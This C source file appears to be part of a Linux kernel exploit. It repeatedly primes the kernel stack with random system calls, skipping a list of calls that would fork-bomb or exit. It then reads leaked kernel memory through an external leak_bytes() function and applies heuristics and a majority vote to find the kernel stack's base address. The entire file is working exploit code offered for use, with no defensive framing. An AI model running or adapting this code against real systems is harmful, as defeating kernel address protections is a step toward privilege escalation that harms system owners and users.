#include <stdio.h>
#include <stdlib.h>
#include <syscall.h>
#include <fcntl.h>
#include <string.h>
#include "kstack.h"

/* As funny as fork-bombing is, we should avoid 
 * priming with certain syscalls */
int is_blacklisted(int sys)
{

	switch(sys) {
		/* 64-bit syscalls */
		#ifdef __x86_64__
		case 12:	/* brk */
		case 13:	/* rt_sigaction */
		case 14:	/* rt_sigprocmask */
		case 15:	/* rt_sigreturn */
		case 22:	/* pipe */
		case 23:	/* select */
		case 32:	/* dup */
		case 33:	/* dup2 */
		case 34:	/* pause */
		case 35:	/* nanosleep */
		case 56:	/* clone */
		case 57:	/* fork */
		case 58:	/* vfork */
		case 60:	/* exit */
		case 61:	/* wait4 */
		
		/* 32-bit syscalls */
		#else
		case 0:		/* restart_syscall */
		case 1:		/* exit */
		case 2:		/* fork */
		case 7:		/* waitpid */
		case 26:	/* ptrace */
		case 29:	/* pause */
		case 36:	/* sync */
		case 41:	/* dup */
		case 42:	/* pipe */
		case 45:	/* brk */
		case 63:	/* dup2 */
		case 67:	/* sigaction */
		case 69:	/* ssetmask */
		case 72:	/* sigsuspend */
		case 73:	/* sigpending */
		case 82:	/* select */
		#endif
			return 1;
		default:
			return 0;
	}
}

inline int test_possible_kstack(unsigned long test)
{

	/* Check the range */
	if(test < KSTACKBASE || test > KSTACKTOP)
		return 0;

	/* Check if it's at a reasonable depth */
	if((test % 4096) < (4096 - DEPTH))
		return 0;

	return 1;
}

/* Given an array of candidate stack addresses,
 * check to see if there's sufficient confidence
 * in our answer.
 *
 * Returns -1 on failure and the index into the
 * candidate array on success */
int check_agreement(unsigned long * can)
{

	int i, j = 0, count = 0;
	unsigned long current;

	current = can[0];

	while(1) {

		count = 0;
		/* Loop through all the candidates */
		for(i = 0; i < NUM_TRIALS; i++) {

			/* Count the number matching the current one */
			if(can[i] == current)
				count++;
		}

		/* If it's more than half the items, there
		 * can't be a more common item */
		if(count > NUM_TRIALS / 2)
			break;

		/* Otherwise, let's move forward and check the
		 * next different element */
		while(can[j] == current && j < NUM_TRIALS)
			j++;

		/* If we reach the end we haven't found a match */
		if(j == NUM_TRIALS)
			return -1;

		current = can[j];
	}

	if(count > THRESHOLD)
		return j;

	return -1;
}

/* Our main function */
unsigned long get_kstack()
{

	int trysys, i, fd, seed, attempt = 0;
	unsigned long * can, * leaked, kstack;

	/* Let's do this the right way... */
	fd = open("/dev/urandom", O_RDONLY);
	read(fd, &seed, sizeof(int));
	close(fd);

	srand(seed);

	/* Keep an array of kstack pointer candidates */
	can = malloc(NUM_TRIALS * sizeof(unsigned long));

	while(1) {

		attempt = 0;

		while(attempt < NUM_TRIALS) {

			/* Get a random syscall */
			trysys = rand() % 100;

			/* Skip the blacklisted ones */
			if(is_blacklisted(trysys))
				continue;

			/* Prime the kstack with a random syscall */
			for(i = 0; i < 4; i++)
				syscall(trysys, 0, 0, 0, 0);

			/* leak_bytes returns a MAGIC-terminated array
			 * of leaked words */
			leaked = leak_bytes();

			for(i = 0; leaked[i] != MAGIC; i++) {

				/* If our heuristics say this is probably a
				 * kstack pointer, keep it as a candidate */		
				if(test_possible_kstack(leaked[i])) {
					/* Assume 8K stack */
					can[attempt] = leaked[i] & ~0x1fff;
					attempt++;
					break;
				}
			}

			free(leaked);
		}
	
		/* check_agreement returns -1 if the most
		 * common candidate occurs less than the
		 * threshold, and the index into our array
		 * containing a winner otherwise */
		i = check_agreement(can);

		if(i >= 0) {
			kstack = can[i];
			free(can);
			return kstack;
		}
	}
}
